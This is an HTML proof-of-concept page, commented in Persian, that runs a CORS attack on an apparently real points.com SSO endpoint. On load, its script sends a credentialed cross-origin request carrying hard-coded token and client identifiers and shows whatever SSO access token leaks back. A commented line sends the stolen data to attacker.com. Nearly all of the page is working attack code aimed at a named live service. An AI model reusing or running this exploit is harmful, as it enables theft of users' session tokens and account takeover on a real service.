<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit - Points.com SSO Token Leak</title>
</head>
<body>
    <h1>Points.com SSO Token Theft PoC</h1>
    <p>این اسکریپت تلاش می‌کند توکن SSO شما را از points.com سرقت کند.</p>
    <div id="output" style="background: #f0f0f0; padding: 10px; border: 1px solid #ccc;">
        در انتظار دریافت پاسخ...
    </div>

    <script>
        const url = "https://bilt-loyaltywallet.points.com/auth/blw/sso";
        
        // داده‌هایی که در درخواست اصلی فرستاده می‌شد
        const data = JSON.stringify({
            "token": "https://lcp.points.com/v1/lps/e4705cc7-173e-4d04-9378-20d0317888f1/mv-delegates/71a4023e-a3d1-4421-aa6f-a995ab8e2d3b",
            "clientId": "1e53ce2f-22d9-4852-a323-52dc5c9baa33"
        });

        async function exploit() {
            try {
                const response = await fetch(url, {
                    method: "POST",
                    mode: "cors",
                    credentials: "include", // ارسال کوکی‌ها (cf_clearance, __cf_bm, ...)
                    headers: {
                        "Content-Type": "text/plain;charset=UTF-8",
                        // نکته: هدر Authorization معمولاً توسط مرورگر در درخواست Cross-Origin 
                        // بدون تایید Preflight مسدود می‌شود. 
                        // اما اگر سرور آن را در لیست Allowed Headers قرار داده باشد، نشت رخ می‌دهد.
                        "Authorization": "Bearer YOUR_ACCESS_TOKEN_HERE" 
                    },
                    body: data
                });

                if (response.ok) {
                    const json = await response.json();
                    document.getElementById("output").innerHTML = 
                        "<h3>Success! SSO AccessToken Leaked:</h3><pre>" + 
                        JSON.stringify(json, null, 2) + "</pre>";
                    
                    // در دنیای واقعی، اتکر این داده را به سرور خودش می‌فرستد:
                    // fetch("https://attacker.com/log?data=" + btoa(JSON.stringify(json)));
                } else {
                    document.getElementById("output").innerText = 
                        "خطا: سرور درخواست را نپذیرفت (Status: " + response.status + ")";
                }
            } catch (err) {
                document.getElementById("output").innerText = 
                    "خطای CORS: دسترسی مسدود شد. سرور اجازه رید از این اوریجین را نمی‌دهد.";
                console.error("CORS Blocked:", err);
            }
        }

        exploit();
    </script>
</body>
